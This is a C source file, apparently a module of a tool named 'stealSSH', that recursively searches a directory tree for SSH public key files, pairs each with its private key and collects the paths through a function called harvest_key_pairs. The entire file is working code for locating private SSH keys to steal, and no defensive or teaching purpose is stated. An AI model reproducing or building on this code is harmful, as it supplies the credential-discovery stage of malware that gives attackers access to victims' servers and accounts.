#define _DEFAULT_SOURCE

#include "stealSSH.h"

#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#define PUB_EXT ".pub"
#define PUB_EXT_LEN 4
#define PATH_MAX 4096


const char* resolve_home_path(const char* path) {
    if (path[0] == '~') {
        const char* home = getenv("HOME");
        if (home) {
            static char fullPath[PATH_MAX];
            snprintf(fullPath, sizeof(fullPath), "%s%s", home, path + 1);
            return fullPath;
        }
    }
    return path;
}
static int is_regular_file(const char *path) {
    struct stat st;
    return stat(path, &st) == 0 && S_ISREG(st.st_mode);
}

static void strip_pub_extension(char *dest, const char *src, size_t len) {
    strncpy(dest, src, len - PUB_EXT_LEN);
    dest[len - PUB_EXT_LEN] = '\0';
}

static int store_key_pair(const char *dir, const char *pubName, sshKey keys[], size_t *count) {
    #ifdef DEBUG
    printf("[DEBUG] Attempting to store key pair for: %s\n", pubName);
    #endif
    size_t nameLen = strlen(pubName);
    if (nameLen <= PUB_EXT_LEN) return 0;

    char privName[PATH_MAX];
    strip_pub_extension(privName, pubName, nameLen);

    char pubPath[PATH_MAX];
    char privPath[PATH_MAX];

    snprintf(pubPath, sizeof(pubPath), "%s/%s", dir, pubName);
    snprintf(privPath, sizeof(privPath), "%s/%s", dir, privName);

    if (!is_regular_file(privPath)) return 0;

    keys[*count].publicKeyPath = strdup(pubPath);
    keys[*count].secretKeyPath = strdup(privPath);

#ifdef DEBUG
    printf("[DEBUG] Key pair found [%zu]:\n  Public: %s\n  Private: %s\n",
           *count, keys[*count].publicKeyPath, keys[*count].secretKeyPath);
#endif

    (*count)++;
    return 1;
}

static void recurse_directory(const char *dir, sshKey keys[], size_t *count) {
    DIR *dp = opendir(dir);
    if (!dp){
        #ifdef DEBUG
        fprintf(stderr, "[DEBUG] Failed to open directory: %s\n", dir);
        #endif
        return;
    }
    struct dirent *entry;
    while ((entry = readdir(dp)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char path[PATH_MAX];
        snprintf(path, sizeof(path), "%s/%s", dir, entry->d_name);
        #ifdef DEBUG
        printf("[DEBUG] Processing entry: %s\n", path);
        #endif

        if (entry->d_type == DT_DIR) {
            #ifdef DEBUG
            printf("[DEBUG] Entering directory: %s\n", path);
            #endif
            recurse_directory(path, keys, count);
        } else if (entry->d_type == DT_REG && strlen(entry->d_name) > PUB_EXT_LEN) {
            const char *ext = entry->d_name + strlen(entry->d_name) - PUB_EXT_LEN;

            if (*count >= MAX_KEY_FILES) break;
            if (strcmp(ext, PUB_EXT) == 0) {
                store_key_pair(dir, entry->d_name, keys, count);
            }
        }
    }

    closedir(dp);
}

void harvest_key_pairs(const char *rootDir, sshKey keys[], size_t *keyCount) {
    recurse_directory(rootDir, keys, keyCount);
}
